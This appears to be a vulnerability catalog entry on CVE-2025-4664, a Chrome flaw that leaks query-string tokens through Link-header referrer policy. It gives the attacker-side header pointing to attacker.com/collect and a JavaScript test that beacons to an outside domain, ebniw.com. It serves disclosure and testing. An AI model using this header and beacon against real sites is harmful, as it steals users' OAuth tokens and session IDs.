Link Header Referrer Policy Cross-Origin Data Leak

ID: UXSS-CHROME-02 CVE: CVE-2025-4664 Browsers: Chrome (pre-136.0.7103.113), Chromium-based Category: Cross-Origin Data Leak

Description

Chrome uniquely processes Link HTTP headers on sub-resource requests, unlike other browsers which ignore them. By setting referrer-policy=unsafe-url in a Link header, an attacker can force Chrome to include full query parameters (including OAuth tokens, session IDs) in the Referer header when fetching sub-resources from an attacker-controlled domain.

This was actively exploited in the wild and added to CISA KEV catalog. Discovered by Vsevolod Kokorin (@slonser_) in May 2025.

Technique

// Attack requires server-side component on attacker domain to set: // Link: <https://attacker.com/collect>; rel=preload; as=image; referrerpolicy=unsafe-url // // Client-side detection test: // 1. Load a page with sensitive query params (simulating OAuth callback) // 2. Include an image from attacker domain // 3. Check if the attacker's server receives full referrer with query params // // Server response header on attacker-controlled resource: // Link: </collect.gif>; rel=preload; as=image; referrerpolicy=unsafe-url // // The browser then sends a preload request with: // Referer: https://victim.com/callback?token=SECRET_TOKEN // Client-side test: Check if Link header referrer-policy override works const img = new Image(); img.src = 'https://ebniw.com/collect?t=' + Date.now(); // If vulnerable, the request Referer will contain full URL including ?secret=xxx
